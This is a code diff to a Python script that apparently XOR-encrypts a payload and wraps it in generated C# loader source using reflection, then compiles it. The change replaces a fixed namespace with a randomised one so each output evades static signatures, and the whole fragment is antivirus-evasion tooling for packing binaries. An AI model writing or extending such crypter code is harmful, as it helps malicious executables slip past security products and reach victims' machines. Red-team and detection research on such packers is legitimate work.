@@ -1,4 +1,6 @@
 import os
+import random
+import string
 import sys
 import subprocess
 import tempfile
@@ -12,13 +14,14 @@ def get_enc_path(path):
     return f"{base}_xorenc{ext}"
 
 def gen_cs_source(payload, xor_key):
+    rand_namespace = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(10))
     payload = ", ".join([hex(x) for x in payload])
     return """
 using System;
 using System.IO;
 using System.Reflection;
 
-namespace XfVaRtk
+namespace [[NAMESPACE]]
 {
     class Program
     {
@@ -71,7 +74,7 @@ namespace XfVaRtk
         }
     }
 }
-    """.replace("[[PAYLOAD]]", payload).replace("[[XOR_KEY]]", xor_key)
+    """.replace("[[NAMESPACE]]", rand_namespace).replace("[[PAYLOAD]]", payload).replace("[[XOR_KEY]]", xor_key)
 
 def compile_cs(cs_source, dst_path):
     with tempfile.NamedTemporaryFile(mode="w") as tmp:
